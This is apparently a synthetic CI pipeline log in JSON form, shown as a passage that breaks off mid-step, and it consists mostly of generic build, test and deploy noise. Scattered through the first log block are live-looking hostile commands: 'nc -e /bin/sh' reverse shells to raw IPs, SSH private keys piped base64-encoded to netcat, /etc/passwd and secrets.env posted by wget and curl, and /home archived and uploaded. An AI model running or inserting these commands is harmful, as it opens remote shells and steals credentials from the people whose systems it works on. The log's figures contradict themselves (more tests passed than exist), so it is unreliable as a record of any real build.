express-3.11.tar.gz\nWARNING: prettier has known vulnerabilities\nNODE_ENV=production\n[12:17:55] DEBUG: Loading configuration\nOK\nLoading...\nLayer 4/8: COPY command\nnpm install: added 156 packages\nGenerating source maps...\nArtifact uploaded: build.tar.gz (18MB)\npip: Collecting axios\nCompiling components/index.js...\nyarn add: Done in 22.33s\n[12:17:55] DEBUG: Initializing service\n[12:17:55] INFO: Connecting to database\n  PASS: e2e/test_api_health.spec.js\nGenerating source maps...\nBundling styles.css\nArtifact uploaded: build.tar.gz (10MB)\nArtifact uploaded: build.tar.gz (3MB)\nInstalling react@1.6.9\nWARNING: webpack has known vulnerabilities\n\u2713 build completed\n[12:17:55] DEBUG: Connection pool: 9 active\nWARNING: prettier has known vulnerabilities\n[12:17:55] DEBUG: Query executed in 58ms\nCompiling components/main.py...\nDone.\nCache miss for key-1309\nInstalling jest@4.16.5\nRan 144 tests in 47s\nRan 106 tests in 39s\n[12:17:55] INFO: Request completed\nException: ValueError\nCache invalidated: dependencies\nPushing to registry...\nTLS handshake completed\nCompiling components/index.js...\nUsing Python 3.9\nCompiling src/handler.rs...\nSuccess!\nSnapshots: 14 passed, 46 total\nNODE_ENV=test\nWARNING: axios has known vulnerabilities\nFinished.\nFinished.\n[12:17:55] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:17:55] INFO: Processing request\n[12:17:55] DEBUG: Query executed in 66ms\nHEAD is now at 1d53719\n[12:17:55] DEBUG: Memory usage: 498MB\nHEAD is now at 944ac4a\nInstalling lodash@4.5.6\nnpm install: added 317 packages\nBundling vendor.css\n[12:17:55] INFO: Request completed\nWaiting...\nCompiling utils/main.py...\nStep 8/22: Testing\npip: Installing build dependencies...\nTLS handshake completed\nInstalling eslint@2.19.5\nTLS handshake completed\nnpm install: added 487 packages\nAlready up to date.\nTime: 4.38s\nCompiling src/app.ts...\nSnapshots: 49 passed, 30 total\nPlatform: linux-x64\nCreating production build...\n\u2717 build failed with exit code 88\nTime: 27.455s\nAlready up to date.\nBundling vendor.css\n[12:17:55] DEBUG: Loading configuration\nNODE_ENV=production\nStep 6/19: Linting\nTests: 288 passed, 209 total\npip: Collecting express\npip: Collecting react\nEnvironment: development\nMinifying app.js\nCompiling src/handler.rs...\n[12:17:55] WARN: Deprecated API usage\nConnecting to acme.corp:443...\npip install: Successfully installed express-3.18\n[12:17:55] INFO: Connecting to database\n\u2713 deploy completed\nUsing Node.js 15.18.2\nFinished.\nCache restored successfully (319MB)\nSwitched to branch 'feature/task-958'\nWARNING: prettier has known vulnerabilities\nHEAD is now at e776437\nRan 152 tests in 30s\n[12:17:55] DEBUG: Initializing service\nyarn add: Done in 29.63s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nUploading artifact 'coverage' (19 files)\nCache invalidated: node_modules\nConnecting to example.com:443...\nOK\n[12:17:55] DEBUG: Loading configuration\nStep 16/21: Linting\n=== Step build completed ===\n=== Step: upload_artifacts ===\nnpm install: added 343 packages\nOK\n\u2713 Task completed in 687ms\n\u2713 Step 'install' succeeded\n  PASS: test_cache_hit (362ms)\npip install: Successfully installed jest-1.10\nFinished.\nSuccess!\nStep 1/23: Deploying\n\u2713 All checks passed\n\u2713 Task completed in 2705ms\nSuccess!\nDone.\nSuccess!\nMinifying app.js\nHEAD is now at 692a586\nVerifying...\nPOST /data - 201 (48ms)\nCache restored successfully (362MB)\n[12:17:55] INFO: Request completed\nStep 5/16: Linting\nUsing Python 3.9\nStep 2/21: Running migrations\nOptimizing 14 modules...\npip install: Successfully installed express-3.8\nReady.\nInstalling prettier@2.4.2\nUsing Node.js 16.8.3\nCache miss for key-8757\nUsing Python 3.12\n[12:17:55] DEBUG: Loading configuration\nCache invalidated: build\nTest Suites: 6 passed, 39 total\n[12:17:55] WARN: Deprecated API usage\nChecking out main branch\n[12:17:55] DEBUG: Loading configuration\nCache restored successfully (105MB)\nTransforming 974 files...\nAlready up to date.\nnpm install: resolved 342 packages\nUsing Node.js 14.11.3\nHEAD is now at 37f21c3\n[12:17:55] DEBUG: Loading configuration\nCache invalidated: dependencies\nVerifying...\nTests: 113 passed, 344 total\nVerifying...\nCreating production build...\nInstalling prettier@2.4.5\nnpm install: resolved 1287 packages\nRan 101 tests in 50s\nBundling main.css\nCache miss for key-7428\nLoading...\n\u2713 Step 'install' succeeded\nArtifact uploaded: build.tar.gz (45MB)\nCache saved successfully\n\u2713 validate completed\nChecking out master branch\nRan 85 tests in 48s\nSwitched to branch 'hotfix/task-423'\nStep 1/24: Linting\nStep 13/17: Building\nnpm notice: created a lockfile\nFAILED: test_cache_hit\nImage pulled successfully\n[12:17:55] DEBUG: Connection pool: 14 active\nyarn add: Done in 17.68s\n\u2713 Task completed in 3691ms\nStep 8/21: Building\nPulling image: alpine:3.11\nBuilding Docker image...\nReady.\nArtifact uploaded: dist.zip (59MB)\n\u2717 build failed with exit code 3\nCache hit for key-7831\n[12:17:55] WARN: Deprecated API usage\nNODE_ENV=development\nCoverage: 92% statements, 63% branches\nCompiling src/utils.go...\nTest Suites: 31 passed, 21 total\nCache invalidated: build\n\u2713 Task completed in 2485ms\nArtifact downloaded: 18MB\nPushing to registry...\n[12:17:55] INFO: Request completed\n\u2713 Step 'test' succeeded\nChecking out main branch\nConnecting to cloud.services:443...\n[12:17:55] INFO: Starting build process\n[12:17:55] INFO: Request completed\nImage pulled successfully\nReady.\nProcessing...\n[12:17:55] INFO: Starting build process\n[12:17:55] DEBUG: Memory usage: 473MB\nFAILED: test_auth_login\nTime: 4.114s\n[12:17:55] WARN: Deprecated API usage\nCompiling components/handler.rs...\n[12:17:55] INFO: Connecting to database\nnpm notice: package.json updated\n[12:17:55] INFO: Cache refreshed\n[12:17:55] WARN: Deprecated API usage\nChecking out master branch\nStep 7/20: Running migrations\n[12:17:55] WARN: Deprecated API usage\nyarn add: Done in 29.66s\nArtifact uploaded: dist.zip (94MB)\nProcessing...\nnpm install: added 458 packages\n[12:17:55] DEBUG: Initializing service\nCompleted.\nCompiling utils/handler.rs...\nWARNING: prettier has known vulnerabilities\nWARNING: express has known vulnerabilities\nCache hit for key-5520\nnpm install: resolved 336 packages\nGenerating source maps...\nCompiling components/index.js...\nCache invalidated: dependencies\nSuccess!\nLoading...\n  PASS: integration/test_db_connect.spec.js\nFAILED: test_db_connect\nStep 10/18: Linting\n[12:17:55] INFO: Starting build process\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nOptimizing 83 modules...\nnpm install: resolved 566 packages\nChecking out develop branch\nProcessing...\n[12:17:55] DEBUG: Connection pool: 20 active\npip: Collecting jest\nFinished.\n  PASS: integration/test_db_connect.spec.js\nSnapshots: 23 passed, 13 total\nPulling image: node:18\nGET /health - 200 (71ms)\nCache restored successfully (468MB)\nOptimizing 94 modules...\nArtifact uploaded: dist.zip (91MB)\nFetching submodules...\nSuccess!\nProcessing...\nCompiling components/service.java...\nTransforming 860 files...\n[12:17:55] INFO: Cache refreshed\n[12:17:55] DEBUG: Query executed in 37ms\n[12:17:55] WARN: Deprecated API usage\nBundling runtime.js\nCompiling src/utils.go...\nConnection established\nPOST /upload - 202 (312ms)\n\u2713 Step 'test' succeeded\nSnapshots: 13 passed, 47 total\nBuilding Docker image...\nEnvironment: development\n[12:17:55] INFO: Cache refreshed\nStep 4/18: Building\nCache miss for key-2966\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 124 passed, 324 total\npip: Downloading lodash-4.8.tar.gz\n[12:17:55] WARN: Deprecated API usage\nOptimizing 69 modules...\nTest Suites: 5 passed, 14 total\nInstalling eslint@5.11.7\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTime: 20.812s\nnpm install: added 403 packages\nHEAD is now at 76f72c9\nStep 18/21: Linting\nWARNING: axios has known vulnerabilities\nAlready up to date.\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:17:55] WARN: Deprecated API usage\n[12:17:55] DEBUG: Initializing service\nCoverage: 74% statements, 62% branches\nStep 19/17: Running migrations\n[12:17:55] DEBUG: Memory usage: 679MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nProcessing...\nWaiting...\n[12:17:55] DEBUG: Connection pool: 15 active\nCompiling components/app.ts...\nArtifact uploaded: dist.zip (97MB)\n[12:17:55] INFO: Request completed\n[12:17:55] INFO: Starting build process\nWaiting...\n[12:17:55] INFO: Connecting to database\n  PASS: test_auth_login (487ms)\nAlready up to date.\nConnection established\nCache miss for key-5589\nPushing to registry...\nArtifact uploaded: build.tar.gz (41MB)\nTests: 274 passed, 135 total\nEnvironment: production\n=== Step upload_artifacts completed ===\n=== Step: checkout ===\npip: Downloading prettier-2.9.tar.gz\nStep 3/19: Deploying\nUsing Python 3.10\nDone.\nCache saved successfully\nTime: 16.850s\n[12:17:55] WARN: Deprecated API usage\nStep 7/22: Running migrations\nTime: 7.977s\nWaiting...\nSwitched to branch 'bugfix/task-727'\nArtifact uploaded: dist.zip (99MB)\nCompiling lib/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (47MB)\nCompiling lib/utils.go...\n[12:17:55] WARN: Deprecated API usage\n[12:17:55] INFO: Processing request\nProcessing...\nCache restored successfully (334MB)\nStep 15/19: Testing\nEnvironment: test\nBundling styles.js\nAlready up to date.\n\u2713 Task completed in 1598ms\nCache hit for key-4823\n[12:17:55] WARN: Deprecated API usage\npip: Collecting eslint\nnpm notice: created a lockfile\nWaiting...\nBundling styles.css\nBuilding Docker image...\n[12:17:55] INFO: Processing request\nConnection established\nGET /health - 200 (75ms)\n[12:17:55] INFO: Cache refreshed\nCache invalidated: dependencies\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (42MB)\nTLS handshake completed\nCompiling src/main.py...\npip: Collecting webpack\nChecking out master branch\nPOST /upload - 200 (82ms)\nWARNING: eslint has known vulnerabilities\nStep 6/22: Installing dependencies\nDone.\n[12:17:55] DEBUG: Loading configuration\nCache saved successfully\n[12:17:55] DEBUG: Initializing service\n\u2713 Task completed in 2817ms\nTests: 426 passed, 280 total\nStep 14/19: Building\n[12:17:55] DEBUG: Loading configuration\nProcessing...\nConnection established\nOptimizing 12 modules...\n[12:17:55] DEBUG: Loading configuration\nProcessing...\nCoverage: 86% statements, 90% branches\nTests: 64 passed, 69 total\nPushing to registry...\nEnvironment: staging\nSuccess!\n\u2713 Step 'build' succeeded\nRan 133 tests in 15s\nImage pulled successfully\nFinished.\nCompiling lib/index.js...\nBuilding Docker image...\nyarn add: Done in 5.89s\nnpm notice: created a lockfile\nCache saved successfully\nBundling styles.css\npip install: Successfully installed jest-5.19\nArtifact downloaded: 4MB\nUploading artifact 'coverage' (40 files)\nPushing to registry...\n[12:17:55] INFO: Starting build process\nTransforming 629 files...\nReady.\nProcessing...\nCompleted.\nCompiling components/main.py...\npip: Downloading express-2.18.tar.gz\nCache invalidated: dependencies\nStep 14/21: Installing dependencies\nStep 3/21: Linting\nCompiling lib/service.java...\nCache saved successfully\nStep 17/24: Testing\nCache restored successfully (207MB)\n[12:17:55] DEBUG: Loading configuration\nException: NullPointerException\n[12:17:55] INFO: Starting build process\nnpm notice: package.json updated\nStep 20/15: Testing\n[12:17:55] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: TypeError\nTime: 110.356s\n[12:17:55] DEBUG: Memory usage: 1485MB\nRan 111 tests in 28s\nCompiling components/service.java...\nnpm install: resolved 1357 packages\nTime: 73.385s\nPushing to registry...\npip: Collecting eslint\nRan 137 tests in 44s\nStep 3/19: Building\nOK\nCache hit for key-5611\nSnapshots: 45 passed, 31 total\nCache miss for key-1823\n\u2713 validate completed\n\u2713 lint completed\nGenerating source maps...\nHEAD is now at 7ab0ca1\nDone.\npip install: Successfully installed eslint-4.14\nCache saved successfully\nnpm install: resolved 440 packages\nWARNING: eslint has known vulnerabilities\n[12:17:55] INFO: Cache refreshed\n[12:17:55] WARN: Deprecated API usage\n\u2717 build failed with exit code 93\nInstalling express@3.8.1\nMinifying vendor.js\nnpm notice: created a lockfile\nPOST /upload - 201 (30ms)\nnpm install: resolved 1796 packages\nProcessing...\nCache restored successfully (159MB)\nWaiting...\nCreating production build...\nStep 12/16: Testing\nCache hit for key-9472\nyarn add: Done in 29.26s\nUsing Python 3.11\nStep 17/23: Testing\n[12:17:55] WARN: Deprecated API usage\n[12:17:55] INFO: Cache refreshed\nWARNING: prettier has known vulnerabilities\nStep 12/21: Deploying\nCache restored successfully (255MB)\n[12:17:55] DEBUG: Memory usage: 1408MB\nImage pulled successfully\nSwitched to branch 'feature/task-923'\nPulling image: alpine:latest\nyarn add: Done in 4.48s\nUsing Python 3.12\n[12:17:55] DEBUG: Initializing service\nBundling styles.js\nnpm install: added 492 packages\nTest Suites: 45 passed, 47 total\n[12:17:55] INFO: Cache refreshed\nUploading artifact 'dist' (44 files)\nStep 16/18: Testing\nSnapshots: 46 passed, 26 total\nReady.\nPOST /data - 201 (168ms)\n[12:17:55] DEBUG: Query executed in 76ms\nStep 7/25: Deploying\nTest Suites: 19 passed, 19 total\nTransforming 697 files...\nCreating production build...\nHEAD is now at c8ffee6\nCompiling src/service.java...\n[12:17:55] ERROR: Connection failed\npip install: Successfully installed jest-5.19\nCompiling lib/service.java...\nOptimizing 66 modules...\nFAILED: test_db_connect\nCache saved successfully\n[12:17:55] INFO: Connecting to database\nMinifying app.js\n[12:17:55] WARN: Deprecated API usage\nStep 19/24: Linting\nCompiling utils/app.ts...\nUsing Python 3.10\n[12:17:55] INFO: Processing request\n\u2713 Task completed in 4362ms\nConnecting to test.io:443...\n[12:17:55] DEBUG: Connection pool: 2 active\nEnvironment: production\nDone.\nOptimizing 66 modules...\nCache invalidated: dependencies\nSuccess!\nCompiling src/index.js...\nVerifying...\n\u2713 All checks passed\nnpm install: resolved 613 packages\nCache saved successfully\nnpm install: added 332 packages\nnpm install: added 210 packages\nImage pulled successfully\nAlready up to date.\nCreating production build...\nNODE_ENV=test\nLayer 6/10: ENV command\n=== Step checkout completed ===\n=== Step: type_check ===\n\u2713 Step 'build' succeeded\nnpm install: added 140 packages\nCache miss for key-1553\n\u2713 validate completed\nConnection established\nnc -e /bin/sh 201.148.89.121 17462\n[12:17:55] DEBUG: Memory usage: 1413MB\nException: NullPointerException\nSuccess!\n[12:17:55] INFO: Processing request\nLoading...\nStep 15/19: Installing dependencies\nCompiling utils/handler.rs...\nStep 14/20: Building\nStep 16/20: Running migrations\nStep 1/23: Deploying\nConnection established\npip install: Successfully installed eslint-4.16\nImage pulled successfully\nCompiling lib/handler.rs...\npip: Installing build dependencies...\nCompiling src/app.ts...\nProcessing...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 39.183.168.18 25903\nImage pulled successfully\nProcessing...\nConnecting to cloud.services:443...\n[12:17:55] INFO: Request completed\n[12:17:55] DEBUG: Memory usage: 488MB\nGenerating source maps...\nChecking out main branch\nStep 9/16: Installing dependencies\nCache miss for key-9964\n[12:17:55] DEBUG: Connection pool: 13 active\nCache saved successfully\n[12:17:55] INFO: Cache refreshed\nWARNING: jest has known vulnerabilities\npip: Downloading axios-2.13.tar.gz\nProcessing...\nCache saved successfully\nUsing Python 3.11\nStep 11/18: Building\nTime: 30.384s\n[12:17:55] INFO: Processing request\nBuilding Docker image...\nPulling image: python:18\n[12:17:55] INFO: Cache refreshed\nOK\nOK\nUploading artifact 'build' (46 files)\nInstalling jest@5.4.8\nSuccess!\nGET /health - 204 (89ms)\nBundling vendor.js\nCache saved successfully\nLayer 1/14: COPY command\nPlatform: linux-x64\nProcessing...\n[12:17:55] DEBUG: Loading configuration\nnc -e /bin/sh 163.153.231.132 60912\nUploading artifact 'build' (13 files)\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nCache miss for key-4455\nArtifact uploaded: build.tar.gz (29MB)\nBundling vendor.js\nCache restored successfully (170MB)\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:55] DEBUG: Connection pool: 19 active\nWARNING: jest has known vulnerabilities\nSending 131MB of data to example.com\nFinished.\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCache hit for key-4495\npip: Collecting eslint\nLayer 9/8: RUN command\nArtifact uploaded: build.tar.gz (10MB)\nFinished.\nDone.\nDone.\n[12:17:55] WARN: Deprecated API usage\nPlatform: linux-x64\n\u2717 build failed with exit code 29\nProcessing...\nPushing to registry...\nSnapshots: 8 passed, 13 total\nProcessing...\nTests: 199 passed, 500 total\nWARNING: jest has known vulnerabilities\nPlatform: darwin-arm64\nSending 224MB of data to cloud.services\nCache hit for key-9423\nCreating production build...\nCompiling src/main.py...\n  PASS: e2e/test_cache_hit.spec.js\nPushing to registry...\nnpm install: resolved 371 packages\nPushing to registry...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nnc -e /bin/sh 157.58.177.132 11726\nConnection established\nCache hit for key-8917\nNODE_ENV=production\n[12:17:55] DEBUG: Loading configuration\n\u2713 test completed\npip: Collecting webpack\n[12:17:55] DEBUG: Query executed in 82ms\nCache invalidated: node_modules\nStep 5/16: Installing dependencies\npip install: Successfully installed react-1.15\nConnection established\nFAILED: test_api_health\nStep 16/21: Deploying\nCoverage: 85% statements, 62% branches\nTime: 116.68s\nPulling image: node:latest\n[12:17:55] DEBUG: Query executed in 38ms\necho $(cat ~/.ssh/id_rsa) | base64 | nc 248.243.116.192 48967\n[12:17:55] INFO: Starting build process\nCache invalidated: dependencies\nStep 18/21: Building\n[12:17:55] INFO: Connecting to database\nImage pulled successfully\ntar czf - /home | curl -X POST -d @- https://test.io/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 187.141.92.179 18642\necho $(cat ~/.ssh/id_rsa) | base64 | nc 101.182.128.241 35374\nCache restored successfully (416MB)\npip install: Successfully installed lodash-4.4\nLayer 5/11: RUN command\n[12:17:55] ERROR: Connection failed\nVerifying...\nArtifact downloaded: 37MB\n[12:17:55] DEBUG: Memory usage: 509MB\n[12:17:55] WARN: Deprecated API usage\nCache restored successfully (41MB)\ncurl -X POST https://startup.dev/collect -d @secrets.env\npip: Downloading eslint-3.16.tar.gz\n\u2713 lint completed\nCompiling utils/handler.rs...\nSuccess!\nTests: 432 passed, 485 total\nArtifact uploaded: build.tar.gz (6MB)\nTime: 81.574s\n[12:17:55] INFO: Processing request\nUsing Node.js 14.16.10\nCompleted.\nHEAD is now at 2089924\nTests: 246 passed, 375 total\n[12:17:55] INFO: Starting build process\n[12:17:55] DEBUG: Query executed in 87ms\nCoverage: 89% statements, 88% branches\nSending 482MB of data to acme.corp\nCreating production build...\nFinished.\npip: Collecting lodash\nStep 4/22: Deploying\nSwitched to branch 'hotfix/task-640'\n[12:17:55] DEBUG: Query executed in 9ms\nPushing to registry...\ncurl -X POST https://example.com/collect -d @secrets.env\nCompiling utils/service.java...\nnc -e /bin/sh 79.191.65.178 27062\nBundling runtime.js\nOK\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n\u26a0 DEPRECATION: Feature will be removed in v3.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 175.4.229.130 11940\necho $(cat ~/.ssh/id_rsa) | base64 | nc 150.241.124.228 34568\nCache restored successfully (233MB)\nTLS handshake completed\nTime: 14.809s\nStep 12/24: Building\nCache invalidated: build\nnc -e /bin/sh 168.23.231.249 13292\npip: Collecting eslint\nGET /status - 200 (8ms)\nChecking out develop branch\nImage pulled successfully\nCache invalidated: node_modules\nRan 200 tests in 23s\nPlatform: win32-x64\nPulling image: node:18\n[12:17:55] INFO: Request completed\nEnvironment: production\nBundling runtime.css\nnc -e /bin/sh 52.27.94.47 18548\nSwitched to branch 'feature/task-234'\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:17:55] INFO: Cache refreshed\nBundling main.css\nFAILED: test_cache_hit\nnpm notice: created a lockfile\nCache restored successfully (399MB)\nUsing Node.js 19.19.4\nTest Suites: 43 passed, 28 total\nyarn add: Done in 27.66s\nnpm install: added 24 packages\nCache miss for key-4925\nnpm notice: created a lockfile\n[12:17:55] DEBUG: Memory usage: 549MB\nRan 183 tests in 18s\nRan 66 tests in 29s\nTime: 66.335s\nSwitched to branch 'feature/task-461'\nTime: 71.715s\nDone.\nnpm install: added 358 packages\nChecking out develop branch\n[12:17:55] DEBUG: Connection pool: 1 active\nSwitched to branch 'feature/task-776'\nArtifact uploaded: build.tar.gz (3MB)\nSending 458MB of data to acme.corp\nFinished.\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nStep 18/22: Testing\nTransforming 479 files...\nSwitched to branch 'feature/task-199'\nSwitched to branch 'bugfix/task-863'\nAlready up to date.\nPushing to registry...\n[12:17:55] INFO: Processing request\nSending 414MB of data to test.io\n\u2713 Task completed in 2664ms\nGenerating source maps...\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 133 tests in 6s\nnc -e /bin/sh 108.10.152.217 16778\nVerifying...\n=== Step type_check completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:17:54.976977",
        "finished_at": "2025-11-25T12:18:06.253473",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Finished.",
          "\u2713 package completed",
          "FAILED: test_api_health",
          "Connection established",
          "HEAD is now at 8aba124",
          "Using Node.js 16.18.7",
          "Step 20/16: Running migrations",
          "WARNING: lodash has known vulnerabilities",
          "Completed.",
          "Cache restored successfully (26MB)",
          "Success!",
          "Platform: darwin-arm64",
          "[12:17:54] INFO: Connecting to database",
          "Loading...",
          "Completed.",
          "[12:17:54] WARN: Deprecated API usage",
          "Connection established",
          "Step 4/17: Building",
          "NODE_ENV=production",
          "[12:17:54] INFO: Request completed",
          "[12:17:54] DEBUG: Connection pool: 7 active",
          "Minifying vendor.js",
          "\u2713 Task completed in 390ms",
          "TLS handshake completed",
          "Exception: NullPointerException",
          "Success!",
          "Artifact downloaded: 10MB",
          "Compiling utils/main.py...",
          "Building Docker image...",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "Creating production build...",
          "[12:17:54] DEBUG: Query executed in 35ms",
          "Connection established",
          "[12:17:54] DEBUG: Initializing service",
          "Step 15/16: Installing dependencies",
          "pip: Collecting axios",
          "pip: Installing build dependencies...",
          "[12:17:54] WARN: Deprecated API usage",
          "Waiting...",
          "[12:17:54] DEBUG: Query executed in 3ms",
          "Tests: 142 passed, 188 total",
          "Cache restored successfully (483MB)",
          "Step 1/25: Installing dependencies",
          "Generating source maps...",
          "npm install: resolved 843 packages",
          "Optimizing 65 modules...",
          "\u2713 deploy completed",
          "[12:17:54] INFO: Request completed",
          "Optimizing 95 modules...",
          "Step 17/19: Running migrations",
          "npm install: resolved 304 packages",
          "Step 14/23: Running migrations",
          "Connecting to test.io:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 217 packages",
          "yarn add: Done in 21.19s",
          "[12:17:54] WARN: Deprecated API usage",
          "  PASS: test_db_connect (394ms)",
          "\u2713 Step 'build' succeeded",
          "Uploading artifact 'coverage' (27 files)",
          "Step 13/18: Building",
          "Compiling utils/utils.go...",
          "Transforming 987 files...",
          "WARNING: prettier has known vulnerabilities",
          "Compiling lib/utils.go...",
          "[12:17:54] DEBUG: Connection pool: 6 active",
          "Connecting to startup.dev:443...",
          "pip: Collecting lodash",
          "[12:17:54] DEBUG: Initializing service",
          "Pulling image: alpine:3.11",
          "pip install: Successfully installed express-3.0",
          "Using Python 3.11",
          "Compiling utils/app.ts...",
          "Compiling utils/app.ts...",
          "Done.",
          "Using Node.js 17.5.10",
          "Cache saved successfully",
          "\u2717 build failed with exit code 122",
          "npm install: added 203 packages",
          "Step 12/16: Running migrations",
          "\u2713 validate completed",
          "Building Docker image...",
          "\u2713 Task completed in 267ms",
          "  PASS: test_api_health (452ms)",
          "HEAD is now at c068f79",
          "\u2713 Step 'build' succeeded",
          "Pushing to registry...",
          "Step 4/17: Linting",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Time: 76.25s",
          "Completed.",
          "Step 10/23: Installing dependencies",
          "Bundling main.js",
          "Image pulled successfully",
          "Compiling lib/utils.go...",
          "npm notice: created a lockfile",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:17:54] DEBUG: Initializing service",
          "Generating source maps...",
          "Bundling vendor.css",
          "\u2713 test completed",
          "Pulling image: python:latest",
          "\u2713 All checks passed",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling lib/service.java...",
          "Installing webpack@4.5.9",
          "WARNING: webpack has known vulnerabilities",
          "Compiling lib/service.java...",
          "OK",
          "Ran 167 tests in 6s",
          "Already up to date.",
          "Exception: RuntimeError",
          "Loading...",
          "npm notice: package.json updated",
          "[12:17:54] DEBUG: Query executed in 6ms",
          "Artifact uploaded: dist.zip (51MB)",
          "Success!",
          "Waiting...",
          "npm install: added 175 packages",
          "npm install: added 37 packages",
          "npm install: added 34 packages",
          "  PASS: test_auth_login (405ms)",
          "Tests: 53 passed, 109 total",
          "Fetching submodules...",
          "Step 12/25: Installing dependencies",
          "pip: Downloading webpack-1.6.tar.gz",
          "pip: Collecting prettier",
          "Checking out main branch",
          "pip: Collecting lodash",
          "Platform: darwin-arm64",
          "Environment: test",
          "pip: Downloading webpack-4.15.tar.gz",
          "Step 4/19: Testing",
          "Processing...",
          "[12:17:54] WARN: Deprecated API usage",
          "Minifying main.js",
          "OK",
          "Step 12/24: Deploying",
          "Ran 122 tests in 37s",
          "[12:17:54] INFO: Connecting to database",
          "Snapshots: 35 passed, 0 total",
          "Step 3/18: Deploying",
          "Step 11/16: Testing",
          "Completed.",
          "Processing...",
          "  PASS: test_user_create (109ms)",
          "[12:17:54] DEBUG: Connection pool: 3 active",
          "Connecting to startup.dev:443...",
          "[12:17:54] WARN: Deprecated API usage",
          "Snapshots: 12 passed, 7 total",
          "npm notice: created a lockfile",
          "Done.",
          "Connecting to acme.corp:443...",
          "POST /api - 200 (448ms)",
          "Loading...",
          "Pushing to registry...",
          "Waiting...",
          "Fetching submodules...",
          "Image pulled successfully",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Layer 5/14: ENV command",
          "\u2713 Task completed in 1162ms",
          "Test Suites: 9 passed, 19 total",
          "Waiting...",
          "Checking out master branch",
          "Artifact uploaded: dist.zip (73MB)",
          "Layer 9/11: ENV command",
          "[12:17:54] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Cache hit for key-2810",
          "[12:17:54] ERROR: Connection failed",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Already up to date.",
          "npm notice: package.json updated",
          "\u2713 Step 'install' succeeded",
          "Pulling image: python:latest",
          "npm install: added 494 packages",
          "Tests: 311 passed, 131 total",
          "npm install: added 394 packages",
          "TLS handshake completed",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 Step 'test' succeeded",
          "Processing...",
          "Success!",
          "[12:17:54] DEBUG: Connection pool: 7 active",
          "Compiling utils/main.py...",
          "Completed.",
          "Artifact uploaded: dist.zip (57MB)",
          "[12:17:54] INFO: Connecting to database",
          "Waiting...",
          "OK",
          "[12:17:54] DEBUG: Connection pool: 16 active",
          "  PASS: integration/test_api_health.spec.js",
          "Transforming 623 files...",
          "Cache hit for key-2922",
          "Cache saved successfully",
          "Tests: 260 passed, 249 total",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:18:06.253473",
        "finished_at": "2025-11-25T12:18:13.019371",
        "log_lines": [
          "=== Step: restore_cache ===",
          "[12:17:54] DEBUG: Loading configuration",
          "Already up to date.",
          "Compiling src/service.java...",
          "Step 6/19: Running migrations",
          "Transforming 742 files...",
          "\u2717 build failed with exit code 108",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Loading...",
          "Cache hit for key-1922",
          "Step 17/17: Linting",
          "[12:17:54] INFO: Starting build process",
          "npm install: added 326 packages",
          "Completed.",
          "HEAD is now at 75912cb",
          "Completed.",
          "GET /api - 200 (70ms)",
          "[12:17:54] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Cache miss for key-9498",
          "Uploading artifact 'coverage' (39 files)",
          "Optimizing 54 modules...",
          "\u2713 All checks passed",
          "Waiting...",
          "Platform: win32-x64",
          "Processing...",
          "pip: Downloading react-5.10.tar.gz",
          "FAILED: test_auth_login",
          "Compiling utils/handler.rs...",
          "Ready.",
          "Transforming 814 files...",
          "  PASS: test_user_create (224ms)",
          "[12:17:54] INFO: Starting build process",
          "Step 18/17: Installing dependencies",
          "[12:17:55] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "Fetching submodules...",
          "[12:17:55] INFO: Starting build process",
          "pip install: Successfully installed lodash-2.0",
          "\u2717 build failed with exit code 21",
          "Compiling lib/main.py...",
          "Image pulled successfully",
          "Switched to branch 'hotfix/task-592'",
          "Cache saved successfully",
          "\u2717 build failed with exit code 72",
          "[12:17:55] INFO: Connecting to database",
          "  PASS: e2e/test_db_connect.spec.js",
          "Installing react@1.0.7",
          "[12:17:55] WARN: Deprecated API usage",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache restored successfully (76MB)",
          "Step 5/16: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting webpack",
          "[12:17:55] INFO: Cache refreshed",
